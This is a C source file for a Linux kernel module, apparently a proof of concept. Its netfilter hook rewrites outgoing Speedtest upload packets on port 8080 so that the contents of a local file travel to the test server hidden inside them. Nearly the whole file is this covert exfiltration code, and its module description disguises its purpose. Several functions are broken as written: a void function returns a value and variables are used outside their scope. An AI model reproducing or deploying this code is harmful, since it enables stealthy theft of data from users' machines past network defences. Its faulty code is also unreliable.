
/*
This LKM modifies TCP PSH/ACK packets over port 8080 to exfiltrate data from a client machine during a Speedtest. 
This code should work with any Ookla Speedtest server using HTTP (e.g. http://speedtest.midco.net).
Tested on Ubuntu 24.04 with version 6.8 kernel. 
*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/inet.h>
#include <linux/string.h>
#include <linux/in.h>
#include <linux/net.h>
#include <linux/skbuff.h>
#include <net/tcp.h>
#include <net/checksum.h>
#include <linux/random.h>
#include <linux/jiffies.h>
#include <linux/file.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Janessa");
MODULE_DESCRIPTION("Kernel module to modify internet speed tests.");

//const vars to skip OPTIONS and POST packets over port 8080
#define SEARCH_STR_OPTIONS "OPTIONS"
#define SEARCH_LEN_OPTIONS 7

#define SEARCH_STR_POST "POST"
#define SEARCH_LEN_POST 4

//total number of bytes exfiled
static unsigned long total_exfiled_bytes = 0;

//netfilter hook options
static struct nf_hook_ops *nfho = NULL; 

//function that demonstrates the exfiltration of a test file.
static void exfil_file(void) {
    //file variables
    struct file *testfile;
    char buffer[100];
    loff_t pos = 0;
    ssize_t bytes_read;

    //Open the file
    testfile = filp_open("/path/to/file.txt", O_RDONLY, 0); //modify test file to exfiltrate here
    if (IS_ERR(testfile)) {
        //pr_err("Failed to open file\n");
        return NF_ACCEPT;
    }

    //Read from the file
    bytes_read = kernel_read(testfile, buffer, sizeof(buffer), &pos);
    if (bytes_read < 0) {
        //pr_err("Failed to read file\n");
        filp_close(testfile, NULL);
        return NF_ACCEPT;
    }

    //null-terminate the buffer
    if (bytes_read >= sizeof(buffer)) {
        bytes_read = sizeof(buffer) -1;
    }
    buffer[bytes_read] = '\0';

    //pr_info("Read %zd bytes: %s\n", bytes_read, buffer); 

    //close file
    filp_close(testfile, NULL);

    //store file in TCP payload
    skb_store_bits(skb, tcp_payloadoffset, buffer, bytes_read);

}
//function that overwrites the TCP payload with random bytes and calculates the maximum number of bytes that can be exfiltrated in a single Speedtest. 
static void max_bytes_exfiled(void) {
    int i;
    char random;
    
    //overwrite the TCP payload with random bytes 
    for (i = 0; i < tcp_payloadlen; i++) {
        random = (i * 31 + 17) & 0XFF;			//get_random_bytes and jiffies slows down speed test reported speeds, using Linear Congruential Generator
        skb_store_bits(skb, tcp_payloadoffset + i, &random, 1);
    }
    
    //add up TCP payload lengths
    total_exfiled_bytes += tcp_payloadlen;
}
//hook function that filters on the PSH/ACK upload speed packets, calls PoC functions, and recalculates checksums. 
static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {

	struct iphdr *ip_header;
	struct tcphdr *tcp_header;

	int ip_hdr_len;					//IP header length
	int tcp_hdr_len;				//TCP header length
	int tcp_payloadoffset; 			//Start of TCP payload
	int tcp_payloadlen;				//TCP payload length
	int total_len;					//total length of packet
	unsigned char *payload_pointer; //pointer to TCP payload

	//convert source IP to bytes
	__be32 source_ip;
	char ip_source[] = "X.X.X.X";	//insert client IP here
	__be32 client_ip = in_aton(ip_source);

	//check if packet is valid
	if (!skb)			
		return NF_ACCEPT;

	//ensure linear data
	if (skb_linearize(skb) < 0)
		return -ENOMEM;

	//extract ip header
	ip_header = ip_hdr(skb);	
	ip_hdr_len = ip_header->ihl * 4;

	//only process tcp packets
	if (ip_header->protocol != IPPROTO_TCP) 
		return NF_ACCEPT;

	//extract tcp header
	tcp_header = tcp_hdr(skb);	
	tcp_hdr_len = tcp_header->doff * 4;

	//extract src ip addr
	source_ip = ip_header->saddr;

	//total packet length
	total_len = ntohs(ip_header->tot_len);

    //filtering on the PSH/ACK upload speed packets over port 8080
	if (ntohs(tcp_header->dest) == 8080 &&
		 source_ip == client_ip &&
		 tcp_header->fin == 0 &&
		 tcp_header->syn == 0 &&
		 tcp_header->rst == 0 &&
		 tcp_header->ack == 1 &&
		 tcp_header->psh == 1 &&
		 total_len > 1500) {

		//integer offset of TCP payload
		tcp_payloadoffset = ip_hdr_len + tcp_hdr_len; 

		//grab pointer to start of TCP payload
		payload_pointer = (unsigned char*)tcp_header + tcp_hdr_len;

		//check to see if TCP payload starts with "OPTIONS" OR "POST" and skip
		if (memcmp(payload_pointer, SEARCH_STR_OPTIONS, SEARCH_LEN_OPTIONS) == 0 ||
			memcmp(payload_pointer, SEARCH_STR_POST, SEARCH_LEN_POST) == 0)
			 return NF_ACCEPT;

		//tcp len = total packet - ip header size
		tcp_payloadlen = total_len - ip_hdr_len - tcp_hdr_len;

        //call function that demos exfil of a test file
        exfil_file();

		//call function that overwrites entire TCP payload with random bytes and calculates the max amount of bytes that can be exfiled in a single Speedtest
        //max_exfiled_bytes();
       
        //zero out checksum
        tcp_header->check = 0;

		//IPv4, calculate partial checksum over TCP data
		if (ip_header->version == 4) {
			tcp_header->check = tcp_v4_check(
				skb->len - ip_hdr_len,
				ip_header->saddr, ip_header->daddr,
				csum_partial(tcp_header, skb->len - ip_hdr_len, 0));
		}
		skb->ip_summed = CHECKSUM_NONE;

		//recalculate IP header checksum
		if(ip_header->version == 4) {
			ip_header->check = 0;
			ip_header->check = ip_fast_csum((unsigned char *)ip_header, ip_header->ihl);
		}
	}
	return NF_ACCEPT;
}
static int __init LKM_init(void)
{
	nfho = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);

	// Initialize netfilter hook
	nfho->hook 	= (nf_hookfn*)hook_func;		//hook function
	nfho->hooknum 	= NF_INET_POST_ROUTING;		//received packets
	nfho->pf 	= PF_INET;						//IPv4
	nfho->priority 	= NF_IP_PRI_FIRST;			//max hook priority

	nf_register_net_hook(&init_net, nfho);
	return 0;
}
static void __exit LKM_exit(void)
{
	nf_unregister_net_hook(&init_net, nfho);
//	pr_info("Total bytes exfiled: %lu\n", total_exfiled_bytes);
}
module_init(LKM_init);
module_exit(LKM_exit);
